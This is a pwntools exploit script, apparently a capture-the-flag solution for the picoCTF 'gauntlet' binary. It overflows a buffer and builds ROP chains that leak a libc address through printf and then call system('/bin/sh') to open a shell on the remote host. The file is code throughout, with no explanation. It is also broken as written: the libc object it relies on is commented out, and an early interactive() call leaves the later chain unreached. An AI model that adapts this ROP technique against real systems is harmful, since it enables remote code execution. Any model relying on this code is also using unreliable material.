from pwn import *
import sys

host = 'mercury.picoctf.net'
port = 57648

# libc = ELF('./libc.so.6')
elf = ELF('./gauntlet')
p = remote(host, port)

p.sendline(b'random_shit')
p.recvline()
# p.sendline(b'random_shit')

pop_rdi = 0x400793
pop_rbp = 0x400608
bss = 0x601800
ret = 0x40053e

offset = 120
func = '__libc_start_main'

payload = b'A' * offset
payload += p64(elf.symbols['fgets'])
p.sendline(payload)

p.interactive()

payload += p64(pop_rbp)
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.symbols['printf'])
payload += p64(ret)
payload += p64(ret)
payload += p64(elf.symbols['main'])

p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

leaked = p.recvline()[:-1]
leaked += b'\x00' * (8 - len(leaked))

leaked_func = u64(leaked)

log.info(f'Leaked {func} address : {hex(leaked_func)}')

libc.address = leaked_func - libc.symbols[func]

payload = b'A' * offset
payload += p64(pop_rbp)
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['puts'])
payload += p64(ret)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.recvline()

p.interactive()

